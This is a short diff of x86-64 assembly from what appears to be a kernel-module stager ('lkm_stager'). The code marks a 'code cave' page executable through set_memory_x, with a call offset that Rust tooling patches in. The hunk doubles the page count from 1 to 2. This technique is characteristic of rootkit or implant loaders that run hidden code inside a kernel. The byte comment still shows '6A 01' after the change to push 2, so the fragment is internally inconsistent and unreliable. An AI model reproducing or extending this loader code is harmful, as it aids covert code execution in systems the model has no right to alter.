@@ -47,10 +47,10 @@ lkm_stager:
 
     and     rdi, -4096                  ; 48 81 E7 00 F0 FF FF  [7]  page-align
 
-    push    1                           ; 6A 01       [2]  arg2: nrpages = 1
+    push    2                           ; 6A 01       [2]  arg2: nrpages = 2
     pop     rsi                         ; 5E          [1]
 
-    ; Call set_memory_x(loader_cave_page, 1) — direct rel32.
+    ; Call set_memory_x(loader_cave_page, 2) — direct rel32.
     ; rel32 is patched by Rust: set_memory_x_virt - (stager_cave_virt + 23)
     db      0xE8                        ; CALL rel32                       [1]
     dd      0x55667788                  ; SET_MEMORY_X_REL_SENTINEL        [4]
